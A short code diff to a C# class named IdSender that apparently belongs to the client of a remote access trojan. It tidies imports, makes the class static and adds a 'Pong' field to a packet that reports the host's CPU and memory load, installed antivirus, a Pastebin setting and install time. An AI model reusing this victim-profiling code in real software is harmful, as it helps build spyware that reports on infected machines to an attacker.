@@ -1,16 +1,13 @@
 ﻿using Client.MessagePack;
 using Microsoft.VisualBasic.Devices;
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Text;
 using System.Windows.Forms;
 
 namespace Client.Helper
 {
-   public class IdSender
+    public static class IdSender
     {
         public static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
         public static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
@@ -31,6 +28,7 @@ namespace Client.Helper
             msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
             msgpack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
             msgpack.ForcePathObject("Installed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
+            msgpack.ForcePathObject("Pong").AsString = "";
             return msgpack.Encode2Bytes();
         }
     }
